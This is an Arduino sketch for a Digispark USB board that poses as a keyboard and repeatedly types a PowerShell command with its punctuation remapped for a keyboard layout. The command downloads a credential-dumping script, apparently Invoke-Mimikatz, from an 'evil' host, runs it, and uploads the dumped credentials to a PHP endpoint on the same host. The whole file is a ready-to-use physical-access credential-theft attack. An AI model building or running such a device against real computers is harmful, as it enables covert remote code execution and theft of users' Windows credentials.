#include "DigiKeyboard.h"

void setup()
{
pinMode(1, OUTPUT); //LED on Model A
}

void loop()
{
DigiKeyboard.update();
// DigiKeyboard.sendKeyStroke(0);

DigiKeyboard.println("powershell @IEX *New/Object Net.WebClient(.DownloadString*|http>&&evil.xxxx.de&im.ps1|(< $output ) Invoke/Pill /DumpCreds< *New/Object Net.WebClient(.UploadString*|http>&&evil.xxxx.de&rx.php|, $output(@");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(15000);
digitalWrite(1, HIGH); //turn on led when program finishes
DigiKeyboard.delay(2000);
digitalWrite(1, LOW);
DigiKeyboard.println("exit");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(15000);
}
